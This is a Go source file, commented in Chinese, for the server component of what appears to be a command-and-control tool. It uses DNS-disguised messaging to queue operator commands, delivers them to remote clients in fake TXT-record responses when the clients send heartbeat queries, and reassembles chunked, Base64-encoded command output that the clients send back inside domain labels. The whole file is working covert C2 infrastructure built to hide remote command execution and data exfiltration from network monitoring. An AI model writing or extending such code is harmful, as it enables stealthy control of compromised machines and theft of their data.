/*
DNS伪装客户端管理器

功能说明：
- 管理与客户端的DNS伪装通信
- 将控制端的普通命令转换为DNS伪装格式发送给客户端
- 接收客户端的DNS伪装响应并解析为普通文本返回给控制端
- 维护客户端连接状态和心跳检测
*/

package server

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"
	"unicode/utf8"
)

// Client 表示连接到服务器的客户端，使用DNS伪装通信
type Client struct {
	ID           int                 // 客户端唯一标识符
	conn         net.Conn            // TCP连接（用于传输DNS伪装数据）
	writerMu     sync.Mutex          // 写操作互斥锁
	isConnected  bool                // 连接状态
	server       *Server             // 服务器引用，用于访问DNS伪装函数
	commandQueue chan string         // 待执行命令队列
	resultChan   chan string         // 命令执行结果通道
	chunkBuffer  map[string][]string // 分块数据缓冲区，键为"totalChunks"，值为chunks数组
	chunkMutex   sync.Mutex          // 分块缓冲区互斥锁
}

// NewClient 创建新的客户端实例
func NewClient(id int, conn net.Conn, server *Server) *Client {
	return &Client{
		ID:           id,
		conn:         conn,
		server:       server,
		isConnected:  true,
		commandQueue: make(chan string, 10),     // 缓冲队列，最多10个待执行命令
		resultChan:   make(chan string, 1),      // 结果通道
		chunkBuffer:  make(map[string][]string), // 分块数据缓冲区
	}
}

// Start 开始客户端处理，支持双向DNS伪装通信
func (c *Client) Start() {
	defer func() {
		c.isConnected = false
		c.conn.Close()
		fmt.Printf("客户端 #%d 连接已关闭\n", c.ID)
	}()

	fmt.Printf("客户端 #%d 开始DNS伪装通信循环\n", c.ID)

	// 处理客户端的DNS请求循环
	for {
		if !c.isConnected {
			return
		}

		// 接收客户端的DNS查询请求
		dnsRequest, err := c.readDNSRequest()
		if err != nil {
			fmt.Printf("客户端 #%d DNS请求读取失败: %v\n", c.ID, err)
			c.isConnected = false
			return
		}

		// 解析DNS请求类型并处理
		err = c.handleDNSRequest(dnsRequest)
		if err != nil {
			fmt.Printf("客户端 #%d DNS请求处理失败: %v\n", c.ID, err)
			c.isConnected = false
			return
		}
	}
}

// SendCommand 向客户端发送命令并获取响应（新的心跳模式）
func (c *Client) SendCommand(cmd string) (string, error) {
	if !c.isConnected {
		return "", fmt.Errorf("客户端 #%d 已断开连接", c.ID)
	}

	fmt.Printf("[服务器调试] 准备向客户端 #%d 发送命令: %s\n", c.ID, cmd)

	// 将命令放入命令队列
	select {
	case c.commandQueue <- cmd:
		// 成功放入队列
	default:
		// 队列已满，清空队列后放入新命令
		for len(c.commandQueue) > 0 {
			<-c.commandQueue
		}
		c.commandQueue <- cmd
	}

	fmt.Printf("[服务器调试] 命令已放入队列，等待客户端 #%d 心跳查询...\n", c.ID)

	// 等待客户端的执行结果（设置超时）
	select {
	case result := <-c.resultChan:
		fmt.Printf("[服务器调试] 收到客户端 #%d 执行结果，长度: %d 字符\n", c.ID, len(result))
		return result, nil
	case <-time.After(60 * time.Second):
		return "", fmt.Errorf("等待客户端 #%d 执行结果超时", c.ID)
	}
}

// GetInfo 返回客户端信息
func (c *Client) GetInfo() string {
	return fmt.Sprintf("客户端 #%d - %s", c.ID, c.conn.RemoteAddr())
}

// Close 关闭客户端连接
func (c *Client) Close() {
	c.isConnected = false
	c.conn.Close()
}

// DNS请求类型定义
type DNSRequestType int

const (
	DNS_REQUEST_HEARTBEAT DNSRequestType = iota // 心跳查询
	DNS_REQUEST_RESULT                          // 结果查询
)

// DNSRequest 表示客户端的DNS请求
type DNSRequest struct {
	Type   DNSRequestType
	Data   string // 对于结果查询，这里存储执行结果
	RawDNS []byte // 原始DNS数据
}

// sendDNSCommand 使用DNS伪装向客户端发送命令
func (c *Client) sendDNSCommand(command string) error {
	// 获取控制器实例来访问DNS伪装函数
	// 这里我们通过server来获取当前活动的控制器
	if len(c.server.controllers) == 0 {
		return fmt.Errorf("没有活动的控制器")
	}

	// 获取第一个控制器（简化处理）
	var controller *Controller
	for ctrl := range c.server.controllers {
		controller = ctrl
		break
	}

	if controller == nil {
		return fmt.Errorf("无法获取控制器实例")
	}

	// 使用控制器的DNS伪装函数发送命令
	return controller.sendDNSCommandToClient(c.conn, command)
}

// readDNSResponse 从客户端读取DNS伪装的响应
func (c *Client) readDNSResponse() (string, error) {
	// 获取控制器实例来访问DNS伪装函数
	if len(c.server.controllers) == 0 {
		return "", fmt.Errorf("没有活动的控制器")
	}

	// 获取第一个控制器（简化处理）
	var controller *Controller
	for ctrl := range c.server.controllers {
		controller = ctrl
		break
	}

	if controller == nil {
		return "", fmt.Errorf("无法获取控制器实例")
	}

	// 使用控制器的DNS伪装函数读取响应
	return controller.readDNSResponseFromClient(c.conn)
}

// readDNSRequest 读取客户端的DNS请求
func (c *Client) readDNSRequest() (*DNSRequest, error) {
	// 设置读取超时
	c.conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	defer c.conn.SetReadDeadline(time.Time{})

	// 读取DNS消息长度（前2字节）
	lengthBytes := make([]byte, 2)
	_, err := c.conn.Read(lengthBytes)
	if err != nil {
		return nil, fmt.Errorf("读取DNS请求长度失败: %w", err)
	}

	messageLength := binary.BigEndian.Uint16(lengthBytes)
	if messageLength == 0 {
		return nil, fmt.Errorf("无效的DNS请求长度: %d", messageLength)
	}

	// 读取完整的DNS请求消息
	dnsData := make([]byte, messageLength)
	totalRead := 0
	for totalRead < int(messageLength) {
		n, err := c.conn.Read(dnsData[totalRead:])
		if err != nil {
			return nil, fmt.Errorf("读取DNS请求数据失败(已读取%d/%d字节): %w", totalRead, messageLength, err)
		}
		totalRead += n
	}

	fmt.Printf("[服务器调试] 客户端 #%d 收到DNS请求: %d 字节\n", c.ID, totalRead)

	// 解析DNS请求类型和内容
	return c.parseDNSRequest(dnsData)
}

// handleDNSRequest 处理客户端的DNS请求
func (c *Client) handleDNSRequest(request *DNSRequest) error {
	switch request.Type {
	case DNS_REQUEST_HEARTBEAT:
		// 处理心跳查询，返回待执行的命令（如果有）
		return c.handleHeartbeatRequest()
	case DNS_REQUEST_RESULT:
		// 处理结果查询，存储执行结果并返回确认
		return c.handleResultRequest(request.Data)
	default:
		return fmt.Errorf("未知的DNS请求类型: %v", request.Type)
	}
}

// handleHeartbeatRequest 处理心跳查询，返回待执行命令
func (c *Client) handleHeartbeatRequest() error {
	fmt.Printf("[服务器调试] 客户端 #%d 发送心跳查询\n", c.ID)

	var command string
	select {
	case command = <-c.commandQueue:
		// 有待执行的命令
		fmt.Printf("[服务器调试] 向客户端 #%d 发送命令: %s\n", c.ID, command)
	default:
		// 没有待执行的命令，返回空命令
		command = ""
		fmt.Printf("[服务器调试] 客户端 #%d 无待执行命令\n", c.ID)
	}

	// 创建包含命令的DNS响应
	return c.sendCommandResponse(command)
}

// handleResultRequest 处理结果查询，存储执行结果
func (c *Client) handleResultRequest(result string) error {
	fmt.Printf("[服务器调试] 客户端 #%d 提交执行结果，长度: %d 字符\n", c.ID, len(result))

	// 检查是否为分块接收确认
	if strings.HasPrefix(result, "CHUNK_RECEIVED_") {
		fmt.Printf("[服务器调试] 收到分块确认: %s\n", result)
		// 对于分块确认，只发送确认响应，不放入结果通道
		return c.sendAcknowledgmentResponse()
	}

	// 将完整结果发送到结果通道
	select {
	case c.resultChan <- result:
		fmt.Printf("[服务器调试] 客户端 #%d 结果已放入通道\n", c.ID)
	default:
		// 结果通道已满，覆盖旧结果
		select {
		case <-c.resultChan:
		default:
		}
		c.resultChan <- result
		fmt.Printf("[服务器调试] 客户端 #%d 结果通道已满，已覆盖旧结果\n", c.ID)
	}

	// 发送确认响应
	fmt.Printf("[服务器调试] 准备向客户端 #%d 发送确认响应\n", c.ID)
	err := c.sendAcknowledgmentResponse()
	if err != nil {
		fmt.Printf("[服务器调试] 向客户端 #%d 发送确认响应失败: %v\n", c.ID, err)
		return fmt.Errorf("发送确认响应失败: %w", err)
	}
	fmt.Printf("[服务器调试] 向客户端 #%d 发送确认响应成功\n", c.ID)
	return nil
}

// parseDNSRequest 解析DNS请求，确定请求类型和内容
func (c *Client) parseDNSRequest(dnsData []byte) (*DNSRequest, error) {
	// 解析DNS头部
	if len(dnsData) < 12 {
		return nil, fmt.Errorf("DNS请求数据不足，需要至少12字节")
	}

	// 解析查询域名
	domain, _, err := c.decodeDomainName(dnsData, 12)
	if err != nil {
		return nil, fmt.Errorf("解析域名失败: %w", err)
	}

	fmt.Printf("[服务器调试] 解析DNS查询域名: %s\n", domain)

	// 根据域名判断请求类型
	if strings.Contains(domain, "heartbeat.cmd") {
		// 心跳查询
		return &DNSRequest{
			Type:   DNS_REQUEST_HEARTBEAT,
			Data:   "",
			RawDNS: dnsData,
		}, nil
	} else if strings.Contains(domain, ".resp.") {
		// 结果查询，从域名中提取结果数据
		parts := strings.Split(domain, ".")
		if len(parts) < 3 {
			return nil, fmt.Errorf("结果查询域名格式错误")
		}

		// 检查是否为分块数据
		if strings.HasPrefix(parts[0], "chunk") && strings.Contains(parts[0], "of") {
			// 分块数据格式：chunk[index]of[total]
			fmt.Printf("[服务器调试] 收到分块数据: %s\n", parts[0])

			// 解析分块信息
			chunkInfo := parts[0] // 例如: chunk1of3

			// 解析分块索引和总数
			var chunkIndex, totalChunks int
			n, err := fmt.Sscanf(chunkInfo, "chunk%dof%d", &chunkIndex, &totalChunks)
			if n != 2 || err != nil {
				return nil, fmt.Errorf("解析分块信息失败: %v", err)
			}

			// 从DNS响应的TXT记录中提取Base64分块数据
			encodedChunk, err := c.extractTXTRecordData(dnsData)
			if err != nil {
				return nil, fmt.Errorf("提取TXT记录数据失败: %v", err)
			}

			fmt.Printf("[服务器调试] 分块信息 - 索引: %d, 总数: %d, TXT数据长度: %d\n",
				chunkIndex, totalChunks, len(encodedChunk))

			// 存储分块数据
			result, isComplete := c.storeChunk(totalChunks, chunkIndex, encodedChunk)

			if isComplete {
				fmt.Printf("[服务器调试] 分块数据接收完成，总长度: %d 字符\n", len(result))
				return &DNSRequest{
					Type:   DNS_REQUEST_RESULT,
					Data:   result,
					RawDNS: dnsData,
				}, nil
			} else {
				fmt.Printf("[服务器调试] 分块数据未完成，等待更多分块...\n")
				// 返回特殊的分块等待请求
				return &DNSRequest{
					Type:   DNS_REQUEST_RESULT,
					Data:   fmt.Sprintf("CHUNK_RECEIVED_%d_OF_%d", chunkIndex, totalChunks),
					RawDNS: dnsData,
				}, nil
			}
		} else {
			// 单块数据
			encodedResult := parts[0]
			fmt.Printf("[服务器调试] 收到单块结果查询，Base64数据: %s (长度: %d)\n", encodedResult, len(encodedResult))

			// Base64解码结果
			decodedBytes, err := base64.URLEncoding.DecodeString(encodedResult)
			if err != nil {
				fmt.Printf("[服务器调试] Base64解码失败: %v，数据: %s\n", err, encodedResult)
				return nil, fmt.Errorf("解码结果数据失败: %w", err)
			}

			result := string(decodedBytes)
			fmt.Printf("[服务器调试] 解析客户端结果成功，长度: %d 字符\n", len(result))

			return &DNSRequest{
				Type:   DNS_REQUEST_RESULT,
				Data:   result,
				RawDNS: dnsData,
			}, nil
		}
	} else {
		return nil, fmt.Errorf("未知的DNS查询类型: %s", domain)
	}
}

// sendCommandResponse 发送包含命令的DNS响应
func (c *Client) sendCommandResponse(command string) error {
	// 创建DNS响应
	response := c.createCommandDNSResponse(command)

	// 发送响应
	return c.sendDNSResponse(response)
}

// sendAcknowledgmentResponse 发送确认响应
func (c *Client) sendAcknowledgmentResponse() error {
	// 创建简单的DNS确认响应
	response := c.createAckDNSResponse()

	// 发送响应
	return c.sendDNSResponse(response)
}

// sendDNSResponse 发送DNS响应数据
func (c *Client) sendDNSResponse(responseData []byte) error {
	// 设置写入超时
	c.conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	defer c.conn.SetWriteDeadline(time.Time{})

	// 发送消息长度（前2字节）
	lengthBytes := make([]byte, 2)
	binary.BigEndian.PutUint16(lengthBytes, uint16(len(responseData)))

	_, err := c.conn.Write(lengthBytes)
	if err != nil {
		return fmt.Errorf("发送DNS响应长度失败: %w", err)
	}

	// 发送DNS响应数据
	_, err = c.conn.Write(responseData)
	if err != nil {
		return fmt.Errorf("发送DNS响应数据失败: %w", err)
	}

	fmt.Printf("[服务器调试] 向客户端 #%d 发送DNS响应: %d 字节\n", c.ID, len(responseData))
	return nil
}

// decodeDomainName 从DNS格式解码域名
func (c *Client) decodeDomainName(data []byte, offset int) (string, int, error) {
	if offset >= len(data) {
		return "", offset, fmt.Errorf("域名数据偏移超界")
	}

	var parts []string
	originalOffset := offset

	for {
		if offset >= len(data) {
			return "", originalOffset, fmt.Errorf("域名数据不完整")
		}

		length := int(data[offset])
		offset++

		if length == 0 {
			break // 域名结束
		}

		// 检查是否为压缩指针
		if length&0xC0 == 0xC0 {
			if offset >= len(data) {
				return "", originalOffset, fmt.Errorf("压缩指针数据不完整")
			}
			// 这是一个压缩指针，跳过处理
			offset++
			break
		}

		if length > 63 {
			return "", originalOffset, fmt.Errorf("无效的域名标签长度: %d", length)
		}

		if offset+length > len(data) {
			return "", originalOffset, fmt.Errorf("域名标签数据不完整")
		}

		part := string(data[offset : offset+length])
		parts = append(parts, part)
		offset += length
	}

	domain := strings.Join(parts, ".")
	return domain, offset, nil
}

// createCommandDNSResponse 创建包含命令的DNS响应
func (c *Client) createCommandDNSResponse(command string) []byte {
	// 创建DNS响应头部
	header := &DNSHeader{
		ID:      c.generateDNSID(),
		Flags:   0x8000 | 0x0400 | 0x0100 | 0x0080, // DNS_FLAG_QR | DNS_FLAG_AA | DNS_FLAG_RD | DNS_FLAG_RA
		QDCount: 1,                                 // 原始查询
		ANCount: 1,                                 // 一个回答
		NSCount: 0,
		ARCount: 0,
	}

	// 编码头部
	dnsPacket := c.encodeDNSHeader(header)

	// 重构原始查询部分（心跳查询）
	queryDomain := fmt.Sprintf("heartbeat.cmd.example.com")
	encodedDomain := c.encodeDomainName(queryDomain)
	dnsPacket = append(dnsPacket, encodedDomain...)

	// 查询类型和类别
	typeAndClass := make([]byte, 4)
	binary.BigEndian.PutUint16(typeAndClass[0:2], 16) // DNS_TYPE_TXT
	binary.BigEndian.PutUint16(typeAndClass[2:4], 1)  // DNS_CLASS_IN
	dnsPacket = append(dnsPacket, typeAndClass...)

	// 添加回答部分
	// 名称压缩指针指向查询部分的域名
	namePointer := []byte{0xc0, 0x0c} // 压缩指针指向偏移12的位置
	dnsPacket = append(dnsPacket, namePointer...)

	// 类型和类别
	dnsPacket = append(dnsPacket, typeAndClass...)

	// TTL (生存时间) - 设置为300秒，模拟正常DNS响应
	ttl := make([]byte, 4)
	binary.BigEndian.PutUint32(ttl, 300)
	dnsPacket = append(dnsPacket, ttl...)

	// TXT记录数据 - 包含Base64编码的命令
	if command != "" {
		encodedCommand := base64.URLEncoding.EncodeToString([]byte(command))
		dataLength := make([]byte, 2)
		binary.BigEndian.PutUint16(dataLength, uint16(len(encodedCommand)+1))
		dnsPacket = append(dnsPacket, dataLength...)

		// TXT记录数据 (长度前缀 + 数据)
		dnsPacket = append(dnsPacket, byte(len(encodedCommand)))
		dnsPacket = append(dnsPacket, []byte(encodedCommand)...)
	} else {
		// 空命令，返回空TXT记录
		dataLength := make([]byte, 2)
		binary.BigEndian.PutUint16(dataLength, 1)
		dnsPacket = append(dnsPacket, dataLength...)
		dnsPacket = append(dnsPacket, byte(0)) // 空TXT记录
	}

	return dnsPacket
}

// createAckDNSResponse 创建DNS确认响应
func (c *Client) createAckDNSResponse() []byte {
	// 创建简单的DNS响应头部
	header := &DNSHeader{
		ID:      c.generateDNSID(),
		Flags:   0x8000 | 0x0400 | 0x0100 | 0x0080, // DNS_FLAG_QR | DNS_FLAG_AA | DNS_FLAG_RD | DNS_FLAG_RA
		QDCount: 1,                                 // 原始查询
		ANCount: 1,                                 // 一个回答
		NSCount: 0,
		ARCount: 0,
	}

	// 编码头部
	dnsPacket := c.encodeDNSHeader(header)

	// 重构原始查询部分（结果查询）
	queryDomain := fmt.Sprintf("ack.resp.example.com")
	encodedDomain := c.encodeDomainName(queryDomain)
	dnsPacket = append(dnsPacket, encodedDomain...)

	// 查询类型和类别
	typeAndClass := make([]byte, 4)
	binary.BigEndian.PutUint16(typeAndClass[0:2], 16) // DNS_TYPE_TXT
	binary.BigEndian.PutUint16(typeAndClass[2:4], 1)  // DNS_CLASS_IN
	dnsPacket = append(dnsPacket, typeAndClass...)

	// 添加回答部分
	namePointer := []byte{0xc0, 0x0c}
	dnsPacket = append(dnsPacket, namePointer...)
	dnsPacket = append(dnsPacket, typeAndClass...)

	// TTL
	ttl := make([]byte, 4)
	binary.BigEndian.PutUint32(ttl, 300)
	dnsPacket = append(dnsPacket, ttl...)

	// 简单的确认TXT记录
	ackMsg := "OK"
	dataLength := make([]byte, 2)
	binary.BigEndian.PutUint16(dataLength, uint16(len(ackMsg)+1))
	dnsPacket = append(dnsPacket, dataLength...)
	dnsPacket = append(dnsPacket, byte(len(ackMsg)))
	dnsPacket = append(dnsPacket, []byte(ackMsg)...)

	return dnsPacket
}

// extractTXTRecordData 从DNS响应中提取TXT记录的数据
func (c *Client) extractTXTRecordData(dnsData []byte) (string, error) {
	// 解析DNS头部
	if len(dnsData) < 12 {
		return "", fmt.Errorf("DNS数据不足")
	}

	header := &DNSHeader{
		ID:      binary.BigEndian.Uint16(dnsData[0:2]),
		Flags:   binary.BigEndian.Uint16(dnsData[2:4]),
		QDCount: binary.BigEndian.Uint16(dnsData[4:6]),
		ANCount: binary.BigEndian.Uint16(dnsData[6:8]),
		NSCount: binary.BigEndian.Uint16(dnsData[8:10]),
		ARCount: binary.BigEndian.Uint16(dnsData[10:12]),
	}

	// 检查是否为DNS响应且有答案记录
	if header.Flags&0x8000 == 0 || header.ANCount == 0 {
		return "", fmt.Errorf("不是有效的DNS响应或无答案记录")
	}

	// 跳过查询部分
	offset := 12
	for i := 0; i < int(header.QDCount); i++ {
		// 跳过域名
		_, nextOffset, err := c.decodeDomainName(dnsData, offset)
		if err != nil {
			return "", fmt.Errorf("跳过查询域名失败: %w", err)
		}
		offset = nextOffset + 4 // 域名 + 类型(2字节) + 类别(2字节)
	}

	// 解析第一个答案记录
	if offset+12 > len(dnsData) {
		return "", fmt.Errorf("DNS答案部分数据不足")
	}

	// 跳过名称（通常是压缩指针）
	if dnsData[offset]&0xC0 == 0xC0 {
		offset += 2 // 压缩指针
	} else {
		// 完整域名
		_, nextOffset, err := c.decodeDomainName(dnsData, offset)
		if err != nil {
			return "", fmt.Errorf("解析答案域名失败: %w", err)
		}
		offset = nextOffset
	}

	// 读取类型、类别、TTL
	if offset+10 > len(dnsData) {
		return "", fmt.Errorf("DNS答案记录数据不足")
	}

	recordType := binary.BigEndian.Uint16(dnsData[offset : offset+2])
	offset += 2
	offset += 2 // 跳过类别
	offset += 4 // 跳过TTL

	// 读取数据长度
	dataLength := binary.BigEndian.Uint16(dnsData[offset : offset+2])
	offset += 2

	if recordType != 16 { // DNS_TYPE_TXT
		return "", fmt.Errorf("不是TXT记录，类型: %d", recordType)
	}

	if dataLength == 0 || offset+int(dataLength) > len(dnsData) {
		return "", fmt.Errorf("TXT记录数据长度无效: %d", dataLength)
	}

	// 解析TXT记录数据
	txtData := dnsData[offset : offset+int(dataLength)]

	if len(txtData) == 0 {
		return "", fmt.Errorf("TXT记录为空")
	}

	txtLength := int(txtData[0])
	if txtLength == 0 || 1+txtLength > len(txtData) {
		return "", fmt.Errorf("TXT记录数据格式错误")
	}

	txtContent := string(txtData[1 : 1+txtLength])
	fmt.Printf("[服务器调试] 从TXT记录提取数据: %s (长度: %d)\n",
		func() string {
			if len(txtContent) > 50 {
				return txtContent[:50] + "..."
			}
			return txtContent
		}(), len(txtContent))

	return txtContent, nil
}

// min 返回两个整数中的较小值
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// 辅助方法
func (c *Client) generateDNSID() uint16 {
	var id [2]byte
	binary.BigEndian.PutUint16(id[:], uint16(time.Now().UnixNano()&0xFFFF))
	return binary.BigEndian.Uint16(id[:])
}

func (c *Client) encodeDNSHeader(header *DNSHeader) []byte {
	buf := make([]byte, 12)
	binary.BigEndian.PutUint16(buf[0:2], header.ID)
	binary.BigEndian.PutUint16(buf[2:4], header.Flags)
	binary.BigEndian.PutUint16(buf[4:6], header.QDCount)
	binary.BigEndian.PutUint16(buf[6:8], header.ANCount)
	binary.BigEndian.PutUint16(buf[8:10], header.NSCount)
	binary.BigEndian.PutUint16(buf[10:12], header.ARCount)
	return buf
}

func (c *Client) encodeDomainName(domain string) []byte {
	if domain == "" {
		return []byte{0}
	}

	parts := strings.Split(domain, ".")
	var result []byte

	for _, part := range parts {
		if len(part) > 63 {
			part = part[:63] // DNS标签最大63字符
		}
		result = append(result, byte(len(part)))
		result = append(result, []byte(part)...)
	}
	result = append(result, 0) // 域名结束标记
	return result
}

// storeChunk 存储分块数据并检查是否接收完成
func (c *Client) storeChunk(totalChunks, chunkIndex int, encodedChunk string) (string, bool) {
	c.chunkMutex.Lock()
	defer c.chunkMutex.Unlock()

	bufferKey := fmt.Sprintf("%d", totalChunks)

	// 初始化分块缓冲区
	if c.chunkBuffer[bufferKey] == nil {
		c.chunkBuffer[bufferKey] = make([]string, totalChunks)
		fmt.Printf("[服务器调试] 初始化分块缓冲区，总块数: %d\n", totalChunks)
	}

	// 存储当前分块（注意：chunkIndex是从1开始的）
	if chunkIndex < 1 || chunkIndex > totalChunks {
		fmt.Printf("[服务器调试] 无效的分块索引: %d (总数: %d)\n", chunkIndex, totalChunks)
		return "", false
	}

	arrayIndex := chunkIndex - 1 // 转换为从0开始的数组索引
	c.chunkBuffer[bufferKey][arrayIndex] = encodedChunk
	fmt.Printf("[服务器调试] 存储分块 %d/%d，数据长度: %d，内容: %s...\n",
		chunkIndex, totalChunks, len(encodedChunk),
		func() string {
			if len(encodedChunk) > 20 {
				return encodedChunk[:20]
			}
			return encodedChunk
		}())

	// 检查是否所有分块都已接收
	receivedCount := 0
	for i := 0; i < totalChunks; i++ {
		if c.chunkBuffer[bufferKey][i] != "" {
			receivedCount++
		}
	}

	fmt.Printf("[服务器调试] 已接收分块: %d/%d\n", receivedCount, totalChunks)

	if receivedCount < totalChunks {
		return "", false
	}

	// 所有分块都已接收，组装完整数据
	fmt.Printf("[服务器调试] 所有分块已接收，开始组装数据\n")
	var combinedBase64 strings.Builder
	var totalLength int

	// 首先输出所有分块内容用于调试
	fmt.Printf("[服务器调试] === 分块详细信息 ===\n")
	for i := 0; i < totalChunks; i++ {
		chunk := c.chunkBuffer[bufferKey][i]
		fmt.Printf("[服务器调试] 分块 %d: 长度=%d, 内容=%s\n", i+1, len(chunk),
			func() string {
				if len(chunk) > 50 {
					return chunk[:50] + "..."
				}
				return chunk
			}())
	}
	fmt.Printf("[服务器调试] === 开始组装 ===\n")

	for i := 0; i < totalChunks; i++ {
		chunk := c.chunkBuffer[bufferKey][i]
		combinedBase64.WriteString(chunk)
		totalLength += len(chunk)
		fmt.Printf("[服务器调试] 组装分块 %d，长度: %d，累计长度: %d\n", i+1, len(chunk), totalLength)
	}

	// 清理缓冲区
	delete(c.chunkBuffer, bufferKey)

	// Base64解码组装后的数据
	encodedData := combinedBase64.String()
	fmt.Printf("[服务器调试] 组装完成 - 总Base64长度: %d，开始解码\n", len(encodedData))

	// 验证Base64数据的完整性
	fmt.Printf("[服务器调试] 组装后的Base64数据（前100字符）: %s\n",
		func() string {
			if len(encodedData) > 100 {
				return encodedData[:100]
			}
			return encodedData
		}())
	fmt.Printf("[服务器调试] 组装后的Base64数据（后50字符）: %s\n",
		func() string {
			if len(encodedData) > 50 {
				return encodedData[len(encodedData)-50:]
			}
			return encodedData
		}())

	// 检查Base64字符串是否包含非法字符
	validBase64Chars := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_="
	for i, char := range encodedData {
		if !strings.ContainsRune(validBase64Chars, char) {
			fmt.Printf("[服务器调试] 发现非法Base64字符 '%c' (0x%02X) 在位置 %d\n", char, char, i)
		}
	}

	// 不要对客户端发送的Base64数据进行任何填充处理！
	// 客户端已经正确处理了Base64编码和分块边界
	fmt.Printf("[服务器调试] 准备解码Base64数据，不进行填充修改\n")

	decodedBytes, err := base64.URLEncoding.DecodeString(encodedData)
	if err != nil {
		fmt.Printf("[服务器调试] 组装后的Base64解码失败: %v\n", err)
		fmt.Printf("[服务器调试] 失败的Base64数据（前100字符）: %s\n",
			func() string {
				if len(encodedData) > 100 {
					return encodedData[:100]
				}
				return encodedData
			}())
		return fmt.Sprintf("组装数据解码失败: %v", err), true
	}

	result := string(decodedBytes)
	fmt.Printf("[服务器调试] 分块数据组装完成 - Base64长度: %d，原始长度: %d\n",
		len(encodedData), len(result))

	// 检查解码后的数据是否为有效UTF-8
	if !utf8.ValidString(result) {
		fmt.Printf("[服务器调试] 警告：组装后的数据不是有效的UTF-8编码\n")
		fmt.Printf("[服务器调试] 原始字节数组长度: %d\n", len(decodedBytes))

		// 尝试检查每个字节
		for i, b := range decodedBytes[:min(50, len(decodedBytes))] {
			fmt.Printf("[服务器调试] 字节 %d: 0x%02X (%d)\n", i, b, b)
		}

		// 使用更宽松的方式处理，保留数据但标记问题
		result = "[编码警告] " + result
	} else {
		fmt.Printf("[服务器调试] UTF-8编码验证通过\n")
	}

	return result, true
}
